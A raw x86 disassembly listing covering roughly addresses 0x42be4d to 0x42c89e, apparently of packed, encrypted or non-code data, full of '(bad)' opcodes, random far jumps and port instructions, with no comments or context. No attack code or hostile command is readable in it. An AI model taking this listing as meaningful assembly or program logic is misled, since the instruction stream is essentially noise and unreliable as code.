  42be4d:	loopne 0x42beb8
  42be4f:	jl     0x42bddc
  42be51:	adc    BYTE PTR ds:0xc857102,0xf2
  42be58:	and    BYTE PTR [eax],al
  42be5a:	dec    edi
  42be5b:	xchg   ebx,eax
  42be5c:	popw   ss
  42be5e:	mov    gs,WORD PTR [ebp+0x37]
  42be61:	or     BYTE PTR [edi+0x52],cl
  42be64:	push   ebx
  42be65:	pop    ebx
  42be66:	test   al,0xc7
  42be68:	xchg   DWORD PTR [ebp+0x24],esi
  42be6b:	loope  0x42bea9
  42be6d:	call   0x579f:0xe3e28d96
  42be74:	loope  0x42be63
  42be76:	std    
  42be77:	xchg   edx,eax
  42be78:	rcl    BYTE PTR [ecx],0x62
  42be7b:	shl    esp,0x9e
  42be7e:	fld    TBYTE PTR [ecx-0x1b3432c4]
  42be84:	and    BYTE PTR [edi+0x79],ah
  42be87:	jo     0x42be3a
  42be89:	sbb    cl,BYTE PTR [edi+0x4d]
  42be8c:	push   eax
  42be8d:	inc    esp
  42be8e:	mov    eax,0x857b16d4
  42be93:	pop    esp
  42be94:	pop    ebx
  42be95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be96:	dec    esi
  42be97:	lods   eax,DWORD PTR ds:[esi]
  42be98:	cmp    edx,DWORD PTR [esi]
  42be9a:	mov    ah,0x87
  42be9c:	cs mov eax,0x41cfb8ea
  42bea2:	inc    eax
  42bea3:	push   edi
  42bea4:	xchg   BYTE PTR [ecx+0x68],al
  42bea7:	adc    eax,0x430da48b
  42beac:	rcl    DWORD PTR [eax-0x3e],cl
  42beaf:	ficom  WORD PTR [eax]
  42beb1:	mov    bl,0x57
  42beb3:	lods   eax,DWORD PTR ds:[esi]
  42beb4:	call   0xeb463d30
  42beb9:	adc    BYTE PTR [ebp+eax*2+0x1b240e3],al
  42bec0:	(bad)  
  42bec1:	repnz add BYTE PTR [eax],al
	...
  42bf34:	stc    
  42bf35:	enter  0xdc7a,0x7b
  42bf39:	(bad)  
  42bf3a:	(bad)  
  42bf3b:	in     eax,dx
  42bf3c:	out    dx,al
  42bf3d:	mov    ah,0x3
  42bf3f:	dec    ecx
  42bf40:	adc    eax,0xf039d897
  42bf45:	rol    DWORD PTR [ecx],1
  42bf47:	add    dh,dh
  42bf49:	add    BYTE PTR [eax],al
  42bf4b:	add    BYTE PTR [esi+0x5a],dl
  42bf4e:	mov    al,0xae
  42bf50:	in     eax,0xb2
  42bf52:	cmp    eax,0xf3e42fb1
  42bf57:	and    DWORD PTR [ebp-0x4f],edx
  42bf5a:	and    DWORD PTR [esi+0xe],ebp
  42bf5d:	stos   DWORD PTR es:[edi],eax
  42bf5e:	aaa    
  42bf5f:	dec    edx
  42bf60:	out    dx,al
  42bf61:	repnz shl ch,0x12
  42bf65:	(bad)  
  42bf66:	jmp    0x42bf54
  42bf68:	in     al,dx
  42bf69:	jg     0x42bf51
  42bf6b:	aas    
  42bf6c:	fiadd  WORD PTR [ecx+ebp*2]
  42bf6f:	test   BYTE PTR cs:[esi-0x68],bh
  42bf73:	(bad)  
  42bf74:	setne  BYTE PTR [ecx+esi*2]
  42bf78:	loopne 0x42bfe1
  42bf7a:	sub    al,0x7e
  42bf7c:	adc    BYTE PTR [edi],0x97
  42bf7f:	lahf   
  42bf80:	dec    ecx
  42bf81:	push   esp
  42bf82:	and    dl,BYTE PTR [edx+0x72]
  42bf85:	dec    edi
  42bf86:	xor    DWORD PTR [eax-0x45],ecx
  42bf89:	jns    0x42bf11
  42bf8b:	adc    edx,DWORD PTR [eax+0x5c]
  42bf8e:	test   DWORD PTR [esi+0x68],edx
  42bf91:	stc    
  42bf92:	jl     0x42bf7e
  42bf94:	das    
  42bf95:	or     DWORD PTR [eax+ebx*2-0x70304979],esp
  42bf9c:	gs test esp,0x159ff545
  42bfa3:	mov    DWORD PTR [ecx],esp
  42bfa5:	sub    dl,BYTE PTR [ebp+ecx*2-0x75]
  42bfa9:	call   0xc6dc:0x12b6bc13
  42bfb0:	sahf   
  42bfb1:	push   ecx
  42bfb2:	mov    ch,0x43
  42bfb4:	pop    ds
  42bfb5:	aad    0xd2
  42bfb7:	sbb    al,0xd7
  42bfb9:	xor    ecx,eax
  42bfbb:	dec    edx
  42bfbc:	mov    ch,0x10
  42bfbe:	sbb    al,0x4
  42bfc0:	ret    0x508b
  42bfc3:	nop    DWORD PTR ds:0x471c55f5
  42bfca:	mov    ch,0xc4
  42bfcc:	and    eax,esp
  42bfce:	push   ebp
  42bfcf:	fst    st(5)
  42bfd1:	cmp    esp,esi
  42bfd3:	(bad)  
  42bfd5:	lds    esp,FWORD PTR [ebx+0x100c217c]
  42bfdb:	jecxz  0x42bf63
  42bfdd:	inc    esi
  42bfde:	int    0xb
  42bfe0:	fisttp WORD PTR [ebx+0xe]
  42bfe3:	cmp    eax,0x6434eb67
  42bfe8:	inc    esi
  42bfe9:	pop    es
  42bfea:	js     0x42bfaa
  42bfec:	outs   dx,DWORD PTR ds:[esi]
  42bfed:	or     esp,DWORD PTR [edx-0x55]
  42bff0:	ss adc al,0x78
  42bff3:	jge    0x42bf9c
  42bff5:	xor    al,0xae
  42bff7:	(bad)
  42bffa:	sbb    DWORD PTR [esi-0x7479a249],ebp
  42c000:	mov    ebp,0x4e6dbaa
  42c005:	test   al,0x3
  42c007:	call   0x1047:0x6a8971af
  42c00e:	add    DWORD PTR ds:0x42bd306b,0x445b3f9d
  42c018:	test   DWORD PTR [eax-0x47],ebp
  42c01b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c01c:	inc    esi
  42c01d:	(bad)  
  42c01f:	fidivr DWORD PTR [esi]
  42c021:	sbb    dl,dl
  42c023:	into   
  42c024:	in     eax,dx
  42c025:	mov    bl,al
  42c027:	xchg   esi,eax
  42c028:	pop    ebp
  42c029:	test   eax,0x2e68a6b4
  42c02e:	push   es
  42c02f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c030:	jnp    0x42bfce
  42c032:	xor    eax,DWORD PTR [ebx+0x44b78f51]
  42c038:	ja     0x42c066
  42c03a:	mov    esi,0xa56ebbde
  42c03f:	(bad)  
  42c041:	jb     0x42c043
	...
  42c0b3:	add    BYTE PTR [ebp+0x25],dh
  42c0b6:	imul   ebx,DWORD PTR [edi-0x51]
  42c0ba:	cmc    
  42c0bb:	(bad)  
  42c0bc:	call   0xc6942915
  42c0c1:	data16 xor al,0xf1
  42c0c4:	out    0xd2,al
  42c0c6:	add    DWORD PTR [eax],eax
  42c0c8:	test   BYTE PTR [eax],0x0
  42c0cb:	add    BYTE PTR [ebp-0x6d],dl
  42c0ce:	dec    esi
  42c0cf:	addr16 mov cl,0x7f
  42c0d2:	cmp    ebp,DWORD PTR ds:0xf35fdee0
  42c0d8:	loope  0x42c096
  42c0da:	jbe    0x42c083
  42c0dc:	adc    ebp,DWORD PTR [edi-0x4c]
  42c0df:	pop    esp
  42c0e0:	xchg   esp,eax
  42c0e1:	mov    al,0xe2
  42c0e3:	cmp    al,0x3b
  42c0e5:	inc    esp
  42c0e6:	out    0x1f,al
  42c0e8:	xchg   ch,dh
  42c0ea:	or     al,0xa9
  42c0ec:	mov    eax,0x46814c86
  42c0f1:	ret    
  42c0f2:	push   es
  42c0f3:	dec    edi
  42c0f4:	or     al,0xbd
  42c0f6:	push   esi
  42c0f7:	inc    ebp
  42c0f8:	call   0xeed4456a
  42c0fd:	loope  0x42c155
  42c0ff:	adc    bh,BYTE PTR [ebp+0x6cb69a08]
  42c105:	jmp    0xcae9ca45
  42c10a:	leave  
  42c10b:	stos   BYTE PTR es:[edi],al
  42c10c:	push   edi
  42c10d:	mov    edi,DWORD PTR es:[esi+0x2c4d969a]
  42c114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c115:	xor    esp,eax
  42c117:	fistp  DWORD PTR [edi]
  42c119:	lock xor al,BYTE PTR [edi-0xe]
  42c11d:	jle    0x42c0ce
  42c11f:	dec    edx
  42c120:	mov    esp,cs
  42c122:	jl     0x42c179
  42c124:	or     eax,0x36d75ef2
  42c129:	or     BYTE PTR [ebp-0x3c6c1126],al
  42c12f:	or     esp,DWORD PTR [eax+0x62]
  42c132:	out    0x5a,al
  42c134:	dec    ebx
  42c135:	push   edx
  42c136:	dec    eax
  42c137:	stc    
  42c138:	out    dx,eax
  42c139:	adc    al,0x25
  42c13b:	ss xor ah,ch
  42c13e:	inc    esp
  42c13f:	test   eax,0x6e060f9f
  42c144:	sbb    DWORD PTR [esi+0x5774fbb0],0x29
  42c14b:	std    
  42c14c:	(bad)  
  42c14d:	jns    0x42c1a0
  42c14f:	sbb    eax,0x9bac7764
  42c154:	fnop   
  42c156:	in     al,0x8d
  42c158:	xchg   edi,eax
  42c159:	aam    0xf0
  42c15b:	sbb    eax,0x4cd434c2
  42c160:	hlt    
  42c161:	test   eax,0x68d92767
  42c166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c167:	lds    ecx,FWORD PTR [ecx]
  42c169:	and    eax,0x9146e656
  42c16e:	imul   ecx,ebp,0x2f06f321
  42c174:	sub    bh,BYTE PTR [ebx+0x15fdaeca]
  42c17a:	push   es
  42c17b:	xlat   BYTE PTR fs:[ebx]
  42c17d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c17e:	dec    esp
  42c17f:	xchg   ecx,eax
  42c180:	ins    DWORD PTR es:[edi],dx
  42c181:	pop    edi
  42c182:	aaa    
  42c183:	or     al,0xa
  42c185:	jg     0x42c1c2
  42c187:	loop   0x42c1b0
  42c189:	push   0xffffffe4
  42c18b:	(bad)
  42c18e:	cwde   
  42c18f:	add    eax,edi
  42c191:	adc    dl,0xb1
  42c194:	out    dx,eax
  42c195:	jns    0x42c1e8
  42c197:	mov    cl,BYTE PTR [esi+0x301e1f9a]
  42c19d:	xchg   ebx,eax
  42c19e:	cdq    
  42c19f:	and    DWORD PTR [ebp+0x5b],esp
  42c1a2:	test   BYTE PTR [edi-0x17],dl
  42c1a5:	xor    WORD PTR [edx],bp
  42c1a8:	cmc    
  42c1a9:	(bad)  
  42c1aa:	call   0xb0107995
  42c1af:	shl    DWORD PTR [edx-0x43977500],1
  42c1b5:	mov    es,ebp
  42c1b7:	shr    BYTE PTR [eax+0x39],0x21
  42c1bb:	(bad)  
  42c1bc:	sbb    eax,0xa75f4a6b
  42c1c1:	cdq    
	...
  42c232:	add    BYTE PTR [eax],al
  42c234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c235:	mov    ds,WORD PTR [ecx-0x28844a0]
  42c23b:	iret   
  42c23c:	xchg   esp,eax
  42c23d:	xor    edx,DWORD PTR [ecx+ebp*1+0xa]
  42c241:	cmp    esi,edx
  42c243:	inc    esp
  42c244:	(bad)  
  42c246:	add    DWORD PTR [eax],eax
  42c248:	test   BYTE PTR [eax],0x0
  42c24b:	add    BYTE PTR [ebx-0x7d],al
  42c24e:	sti    
  42c24f:	popa   
  42c250:	inc    esp
  42c251:	mov    DWORD PTR ss:[ebx+ebp*2],edx
  42c255:	push   es
  42c256:	push   esi
  42c257:	hlt    
  42c258:	into   
  42c259:	in     eax,0x40
  42c25b:	xchg   esp,eax
  42c25c:	jno    0x42c27a
  42c25e:	outs   dx,DWORD PTR ds:[esi]
  42c25f:	and    al,0xbe
  42c261:	and    DWORD PTR ds:0x819c8ebf,ebp
  42c267:	jae    0x42c289
  42c269:	ds pop ebp
  42c26b:	rcr    BYTE PTR [eax],cl
  42c26d:	xchg   ebx,eax
  42c26e:	adc    DWORD PTR [ebp+0xf],0xffffffd0
  42c272:	jmp    0x42c2da
  42c274:	mov    esi,cs
  42c276:	ror    DWORD PTR [edx+0x10],0xe4
  42c27a:	cwde   
  42c27b:	xchg   esi,eax
  42c27c:	lods   eax,DWORD PTR ds:[esi]
  42c27d:	test   DWORD PTR [eax+0x1c],ebp
  42c280:	add    al,BYTE PTR [ecx]
  42c282:	out    dx,eax
  42c283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c284:	xor    esp,ebx
  42c286:	push   ecx
  42c287:	int    0x35
  42c289:	jge    0x42c27b
  42c28b:	pop    edx
  42c28c:	mov    ds:0x81958aa4,eax
  42c291:	pop    ebp
  42c292:	push   ebx
  42c293:	and    DWORD PTR [edx],edi
  42c295:	pop    ds
  42c296:	pusha  
  42c297:	pop    ecx
  42c298:	inc    esp
  42c299:	fdivr  QWORD PTR [ebp+0x76]
  42c29c:	out    0xbf,al
  42c29e:	fbld   TBYTE PTR [ebx]
  42c2a0:	mov    ch,0xea
  42c2a2:	and    eax,0x335ce97
  42c2a7:	xor    al,0x62
  42c2a9:	fstp   DWORD PTR [ebp+ecx*4+0x22c7d4f8]
  42c2b0:	lahf   
  42c2b1:	xor    eax,0x1c7ad200
  42c2b6:	inc    ecx
  42c2b7:	adc    DWORD PTR [edx+0x3094ffe4],esp
  42c2bd:	(bad)  
  42c2be:	mov    eax,ds:0xab7828ef
  42c2c3:	(bad)  
  42c2c4:	(bad)  
  42c2c5:	das    
  42c2c6:	stos   DWORD PTR es:[edi],eax
  42c2c7:	mov    ?,WORD PTR [esi-0x2d]
  42c2ca:	adc    DWORD PTR [edi+0x60],esi
  42c2cd:	(bad)  
  42c2ce:	hlt    
  42c2cf:	mov    ds:0xd5a3c388,eax
  42c2d4:	adc    eax,0xefc29896
  42c2d9:	mov    cl,0x1
  42c2db:	dec    ebp
  42c2dc:	into   
  42c2dd:	xchg   esp,eax
  42c2de:	jle    0x42c2be
  42c2e0:	mov    ecx,0xcca10537
  42c2e5:	arpl   si,si
  42c2e7:	push   ebx
  42c2e8:	pusha  
  42c2e9:	je     0x42c360
  42c2eb:	mov    eax,0x418bb85d
  42c2f0:	(bad)  
  42c2f1:	xlat   BYTE PTR ds:[ebx]
  42c2f2:	jno    0x42c2e9
  42c2f4:	or     BYTE PTR ds:[eax+0x2e],bl
  42c2f8:	(bad)  
  42c2fa:	inc    ebp
  42c2fb:	mov    ch,0x85
  42c2fd:	jae    0x42c27f
  42c2ff:	ret    
  42c300:	fwait
  42c301:	dec    ebx
  42c302:	xor    ah,BYTE PTR [eax+eax*2-0x31]
  42c306:	xchg   edx,eax
  42c307:	addr16 adc eax,0x95c27dc9
  42c30d:	aam    0x39
  42c30f:	fst    DWORD PTR [ecx]
  42c311:	jb     0x42c2e4
  42c313:	add    eax,0x892cdeba
  42c318:	rcr    ecx,cl
  42c31a:	adc    eax,eax
  42c31c:	add    DWORD PTR [esp+ebx*4],esp
  42c31f:	leave  
  42c320:	jno    0x42c2b9
  42c322:	mov    ch,0x73
  42c324:	pop    es
  42c325:	adc    al,0xb8
  42c327:	fist   WORD PTR [esi]
  42c329:	(bad)  
  42c32a:	int3   
  42c32b:	xchg   edi,eax
  42c32c:	cmp    ebx,DWORD PTR [ecx-0x8]
  42c32f:	xchg   edx,eax
  42c330:	sbb    DWORD PTR [edi-0x79f05642],eax
  42c336:	jg     0x42c376
  42c338:	lods   eax,DWORD PTR gs:[esi]
  42c33a:	lahf   
  42c33b:	mov    ch,0xc8
  42c33d:	push   ss
  42c33e:	stos   BYTE PTR es:[edi],al
  42c33f:	cwde   
  42c340:	popa   
  42c341:	sbb    DWORD PTR [eax],eax
	...
  42c3b3:	add    BYTE PTR [edx-0x1011dfbb],cl
  42c3b9:	out    dx,eax
  42c3ba:	into   
  42c3bb:	gs aam 0xa
  42c3be:	fst    DWORD PTR [ecx+0x3e]
  42c3c1:	shl    DWORD PTR [ebx-0x5a],1
  42c3c4:	rcl    ah,cl
  42c3c6:	add    DWORD PTR [eax],eax
  42c3c8:	test   BYTE PTR [eax],0x0
  42c3cb:	add    BYTE PTR ds:0xee22a572,al
  42c3d1:	add    ah,ah
  42c3d3:	inc    eax
  42c3d4:	shl    BYTE PTR [edi+ebx*1+0x23],cl
  42c3d8:	cld    
  42c3d9:	mov    ds:0xe8ea3bd8,al
  42c3de:	lea    esp,[ecx+0x6ce5119]
  42c3e4:	sub    al,0x25
  42c3e6:	pop    ecx
  42c3e7:	inc    BYTE PTR [edi]
  42c3e9:	aad    0xf5
  42c3eb:	ins    BYTE PTR es:[edi],dx
  42c3ec:	sbb    DWORD PTR [esi+0xded60f4],0xaf8ba3c1
  42c3f6:	xchg   BYTE PTR ds:0x93dac2d1,al
  42c3fc:	aaa    
  42c3fd:	and    ah,BYTE PTR [eax]
  42c3ff:	sti    
  42c400:	or     BYTE PTR [esi],al
  42c402:	lock or BYTE PTR [esi-0x289100ae],0xe5
  42c40a:	sbb    ebx,ebx
  42c40c:	mov    ecx,0xf7bb97bb
  42c411:	add    eax,0x7feb954
  42c416:	in     eax,dx
  42c417:	ja     0x42c455
  42c419:	mov    ecx,0xdc30499a
  42c41e:	int    0x48
  42c420:	outs   dx,BYTE PTR ds:[esi]
  42c421:	imul   esi,DWORD PTR [eax-0xb],0x44825369
  42c428:	out    dx,eax
  42c429:	mov    ?,WORD PTR [edi-0x4d]
  42c42c:	push   eax
  42c42d:	mov    ah,0x58
  42c42f:	mov    dl,0xef
  42c431:	pop    edi
  42c432:	in     al,dx
  42c433:	adc    ecx,DWORD PTR ds:0x4d677d5d
  42c439:	inc    edx
  42c43a:	test   bl,al
  42c43c:	repz adc bh,BYTE PTR [eax+0x44]
  42c440:	push   ebx
  42c441:	and    ah,dl
  42c443:	xchg   edx,eax
  42c444:	paddb  mm1,QWORD PTR [edi+edx*8-0x5384de48]
  42c44c:	enter  0x4ee1,0x3a
  42c450:	les    edi,FWORD PTR [edx-0x2a2c2b31]
  42c456:	retf   0xd3e6
  42c459:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c45b:	mov    ebp,0x593922a8
  42c460:	bound  edi,QWORD PTR [edi+0x44907584]
  42c466:	xchg   ebx,eax
  42c467:	sbb    al,0xb1
  42c469:	cmp    BYTE PTR [esi+0x1b218539],cl
  42c46f:	jmp    0x79cb:0xa2f21e96
  42c476:	xor    ebx,DWORD PTR ds:0xbbb5997e
  42c47c:	pop    ss
  42c47d:	sub    BYTE PTR [ecx+edi*1-0x57cf3031],al
  42c484:	and    eax,DWORD PTR [ecx+0x58]
  42c487:	inc    ebx
  42c488:	outs   dx,BYTE PTR ds:[esi]
  42c489:	mov    cl,0x34
  42c48b:	mov    ecx,0x2f93ba22
  42c490:	xor    eax,0x9d6cdcb5
  42c495:	iret   
  42c496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c497:	mov    eax,0x3fa7890
  42c49c:	lods   al,BYTE PTR ds:[esi]
  42c49d:	pop    eax
  42c49e:	enter  0x8f83,0x60
  42c4a2:	xor    DWORD PTR [edx+0x13625ff0],ecx
  42c4a8:	lods   eax,DWORD PTR ds:[esi]
  42c4a9:	dec    ebx
  42c4aa:	fucomp st(6)
  42c4ac:	data16 and cl,BYTE PTR [edi+0x58]
  42c4b0:	mov    ds:0x2796d204,eax
  42c4b5:	mov    dh,ch
  42c4b7:	cmp    eax,0x814a43f2
  42c4bc:	sub    DWORD PTR [edi+0x49],0xffffffc9
  42c4c0:	loope  0x42c45d
	...
  42c532:	add    BYTE PTR [eax],al
  42c534:	loopne 0x42c4ca
  42c536:	and    bh,cl
  42c538:	je     0x42c539
  42c53a:	out    dx,eax
  42c53b:	mov    edi,0x9a7cd6c5
  42c540:	jecxz  0x42c565
  42c542:	pop    ebx
  42c543:	retf   0xd5c8
  42c546:	add    DWORD PTR [eax],eax
  42c548:	test   BYTE PTR [eax],0x0
  42c54b:	add    BYTE PTR [edx],ch
  42c54d:	imul   ecx,DWORD PTR [ecx+0x29],0x6d
  42c551:	mov    DWORD PTR [ecx+0x28e3186f],0x2fc3c891
  42c55b:	inc    ebx
  42c55c:	jl     0x42c5b2
  42c55e:	cmp    DWORD PTR [ecx+0x4c],eax
  42c561:	push   edi
  42c562:	jbe    0x42c5ba
  42c564:	pushf  
  42c565:	cmp    al,0xee
  42c567:	adc    ecx,DWORD PTR [ebx+ecx*2+0x9c6e317]
  42c56e:	xor    dl,BYTE PTR [edx]
  42c570:	sub    eax,DWORD PTR [ebx+0x79e3fc7a]
  42c576:	mov    ah,0x29
  42c578:	dec    edx
  42c579:	push   ebx
  42c57a:	mov    esi,0x651c04f8
  42c57f:	add    BYTE PTR [ebx+ecx*1-0x48],0x90
  42c584:	lods   al,BYTE PTR ds:[esi]
  42c585:	(bad)  
  42c586:	sbb    DWORD PTR [esi],ebx
  42c588:	fcmove st,st(2)
  42c58a:	xchg   BYTE PTR [ebx],al
  42c58c:	jae    0x42c601
  42c58e:	jno    0x42c5b2
  42c590:	dec    esp
  42c591:	dec    ecx
  42c592:	pop    esp
  42c593:	lods   eax,DWORD PTR ds:[esi]
  42c594:	ins    DWORD PTR es:[edi],dx
  42c595:	dec    edi
  42c596:	and    BYTE PTR [edi],dl
  42c598:	mov    esi,0xc5054c38
  42c59d:	shr    cl,0xe
  42c5a0:	pop    ebx
  42c5a1:	outs   dx,BYTE PTR ds:[esi]
  42c5a2:	inc    esi
  42c5a3:	sub    ecx,DWORD PTR [esi-0x16]
  42c5a6:	xchg   DWORD PTR [edi],eax
  42c5a8:	in     al,0xb
  42c5aa:	enter  0x3102,0x17
  42c5ae:	fsub   st,st(1)
  42c5b0:	mov    ebx,0xfcebc058
  42c5b5:	mov    ecx,0xc61e994e
  42c5ba:	add    ebp,ecx
  42c5bc:	out    0x39,al
  42c5be:	dec    edi
  42c5bf:	mov    eax,0x9f9c0aba
  42c5c4:	mov    al,0x5c
  42c5c6:	fcmovu st,st(2)
  42c5c8:	or     DWORD PTR [edx],0xb
  42c5cb:	jno    0x42c631
  42c5cd:	inc    ecx
  42c5ce:	enter  0x523e,0x3b
  42c5d2:	sti    
  42c5d3:	mov    bl,bl
  42c5d5:	bound  edi,QWORD PTR [edx+edx*1+0x76]
  42c5d9:	icebp  
  42c5da:	xchg   ebx,eax
  42c5db:	out    dx,al
  42c5dc:	dec    ebp
  42c5dd:	mov    dh,0xb5
  42c5df:	fnsave [ebx-0x15]
  42c5e2:	lds    edx,FWORD PTR [edi+0xf]
  42c5e5:	push   es
  42c5e6:	or     al,0x7c
  42c5e8:	ror    BYTE PTR [ebp-0x125f74d2],1
  42c5ee:	xchg   ecx,eax
  42c5ef:	or     eax,0x1d8e93d1
  42c5f4:	addr16 jo 0x42c661
  42c5f7:	pusha  
  42c5f8:	mov    al,ds:0xa5b5a286
  42c5fd:	lods   eax,DWORD PTR ds:[esi]
  42c5fe:	(bad)  
  42c5ff:	jnp    0x42c5fb
  42c601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c602:	pop    ebx
  42c603:	call   0xe5d:0xe38588bb
  42c60a:	fnsave [ebx-0x34f5ffca]
  42c610:	inc    esi
  42c611:	dec    ecx
  42c612:	sub    DWORD PTR [ebx-0x7f],0xc4e333e3
  42c619:	daa    
  42c61a:	jmp    DWORD PTR [edi-0x642ab407]
  42c620:	std    
  42c621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c622:	jnp    0x42c605
  42c624:	push   esi
  42c625:	in     eax,0xde
  42c627:	imul   ebx,DWORD PTR [eax-0x6c],0xd
  42c62b:	jmp    0xc448:0x3ca59528
  42c632:	lock jb 0x42c5e4
  42c635:	loope  0x42c6a0
  42c637:	mov    esp,0x4cd19616
  42c63c:	js     0x42c670
  42c63e:	xor    al,0xd6
  42c640:	jge    0x42c5f5
	...
  42c6b2:	add    BYTE PTR [eax],al
  42c6b4:	dec    esi
  42c6b5:	inc    edx
  42c6b6:	dec    ecx
  42c6b7:	daa    
  42c6b8:	dec    ebp
  42c6b9:	das    
  42c6ba:	outs   dx,BYTE PTR ds:[esi]
  42c6bb:	imul   ebp,esi,0x7b
  42c6be:	enter  0x6be,0x26
  42c6c2:	mov    eax,ds:0x1d6be24
  42c6c7:	add    dh,dh
  42c6c9:	add    BYTE PTR [eax],al
  42c6cb:	add    BYTE PTR [esi-0x3f],bh
  42c6ce:	cmp    bh,BYTE PTR [eax]
  42c6d0:	cli    
  42c6d1:	add    eax,0xb3ccd08a
  42c6d6:	mov    dl,cl
  42c6d8:	lock aaa 
  42c6da:	and    ah,dl
  42c6dc:	fisub  DWORD PTR [edx+0x3b5c5dff]
  42c6e2:	xlat   BYTE PTR ds:[ebx]
  42c6e3:	lods   al,BYTE PTR ds:[esi]
  42c6e4:	cld    
  42c6e5:	lock mov ss,WORD PTR [ebx-0x195d98cd]
  42c6ec:	add    DWORD PTR [ebx+0x24145c7f],edx
  42c6f2:	std    
  42c6f3:	or     eax,0x277e8156
  42c6f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6f9:	mov    bl,BYTE PTR [esi]
  42c6fb:	aaa    
  42c6fc:	jmp    0x9b0c915a
  42c701:	or     ch,BYTE PTR [ebp-0x34]
  42c704:	mov    al,0x44
  42c706:	pushf  
  42c707:	lods   eax,DWORD PTR ds:[esi]
  42c708:	jno    0x42c6c3
  42c70a:	mov    dh,BYTE PTR [edi+0x5]
  42c70d:	mov    ch,ch
  42c70f:	cdq    
  42c710:	mov    BYTE PTR [esi-0x64],ch
  42c713:	mov    DWORD PTR [ebp-0x10b2f341],ebx
  42c719:	nop
  42c71a:	(bad)  
  42c71b:	rol    BYTE PTR [eax],1
  42c71d:	das    
  42c71e:	push   eax
  42c71f:	(bad)  
  42c720:	sbb    eax,0xa0c5ee34
  42c725:	das    
  42c726:	cmc    
  42c727:	jmp    0x42c775
  42c729:	xchg   ecx,eax
  42c72a:	loop   0x42c6e2
  42c72c:	pop    es
  42c72d:	stos   BYTE PTR es:[edi],al
  42c72e:	stc    
  42c72f:	clc    
  42c730:	shl    DWORD PTR [ecx],cl
  42c732:	inc    eax
  42c733:	sar    cl,0x50
  42c736:	mov    ecx,ecx
  42c738:	jmp    0xf5bf44a8
  42c73d:	test   al,0x11
  42c73f:	mov    esi,DWORD PTR [esi]
  42c741:	test   DWORD PTR [edx-0x20],eax
  42c744:	fld    DWORD PTR [ebp-0x1c]
  42c747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c748:	loopne 0x42c7b5
  42c74a:	fadd   DWORD PTR [esi]
  42c74c:	in     eax,0xe2
  42c74e:	dec    ecx
  42c74f:	xor    al,0xde
  42c751:	xor    al,BYTE PTR [ebx-0x136c1d20]
  42c757:	cmp    al,0x47
  42c759:	shr    DWORD PTR [ebp-0x39],cl
  42c75c:	mov    esi,0x758ff60a
  42c761:	outs   dx,BYTE PTR ds:[esi]
  42c762:	push   cs
  42c763:	(bad)  
  42c764:	mov    ch,0xe8
  42c766:	outs   dx,DWORD PTR ds:[esi]
  42c767:	arpl   WORD PTR [ecx],cx
  42c769:	loope  0x42c72e
  42c76b:	or     BYTE PTR [edx*4+0x4873cfba],al
  42c772:	out    0x83,eax
  42c774:	push   0x6b
  42c776:	pop    edx
  42c777:	push   edx
  42c778:	in     al,0x59
  42c77a:	dec    esi
  42c77b:	aam    0x60
  42c77d:	(bad)  
  42c77e:	push   DWORD PTR [edx+0x64961d12]
  42c784:	fwait
  42c785:	sets   BYTE PTR [eax+esi*8-0x2492e8d6]
  42c78d:	repnz or eax,0x686a3fc2
  42c793:	xchg   esi,eax
  42c794:	cmp    al,BYTE PTR [edx]
  42c796:	and    al,0x4a
  42c798:	(bad)  
  42c79a:	lds    edx,FWORD PTR [eax+0x2f]
  42c79d:	jno    0x42c7c8
  42c79f:	les    ebp,FWORD PTR [ecx-0x69]
  42c7a2:	push   ebp
  42c7a3:	out    0x61,eax
  42c7a5:	cmp    DWORD PTR ds:0xac1e3bee,0xffffff8d
  42c7ac:	in     eax,dx
  42c7ad:	les    ebp,FWORD PTR ds:0xfe61c981
  42c7b3:	xchg   esp,eax
  42c7b4:	mov    dh,0x68
  42c7b6:	mov    dh,0x99
  42c7b8:	out    0xe2,al
  42c7ba:	xchg   BYTE PTR [ecx+0x6f],bl
  42c7bd:	arpl   WORD PTR [eax],bp
  42c7bf:	sub    edi,DWORD PTR [ebx+0x33]
	...
  42c832:	add    BYTE PTR [eax],al
  42c834:	call   0x2a86d6
  42c839:	out    0xf9,eax
  42c83b:	lahf   
  42c83c:	or     ch,bh
  42c83e:	fdiv   DWORD PTR ds:0x2f04519
  42c844:	mov    ah,0xd7
  42c846:	add    DWORD PTR [eax],eax
  42c848:	test   BYTE PTR [eax],0x0
  42c84b:	add    BYTE PTR ds:0x201daae4,al
  42c851:	sub    al,0x5a
  42c853:	jle    0x42c863
  42c855:	int3   
  42c856:	or     ebx,DWORD PTR [edx-0x79]
  42c859:	iret   
  42c85a:	stos   DWORD PTR es:[edi],eax
  42c85b:	mov    al,0xd1
  42c85d:	shl    BYTE PTR [eax+edi*4-0x52],0xf2
  42c862:	data16 stos BYTE PTR es:[edi],al
  42c864:	imul   edx,edx,0x26
  42c867:	cmp    DWORD PTR [eax+0x62],eax
  42c86a:	std    
  42c86b:	pop    ss
  42c86c:	mov    bl,BYTE PTR [edx+0x6c9a7af8]
  42c872:	imul   BYTE PTR [ebp-0x62]
  42c875:	dec    edi
  42c876:	and    ah,al
  42c878:	or     eax,esi
  42c87a:	dec    ebx
  42c87b:	(bad)  
  42c87c:	pop    esp
  42c87d:	xor    BYTE PTR [ecx+ecx*2],dh
  42c880:	xor    al,0xbc
  42c882:	xor    DWORD PTR [ecx],ebx
  42c884:	and    WORD PTR ds:0x7396c9d5,sp
  42c88b:	aaa    
  42c88c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c88d:	int3   
  42c88e:	jmp    0x5bd0:0x686c78ae
  42c895:	out    dx,eax
  42c896:	cli    
  42c897:	add    eax,0xebc9ca16
  42c89c:	and    ecx,esp
  42c89e:	mov    ebx,0xb97d8118
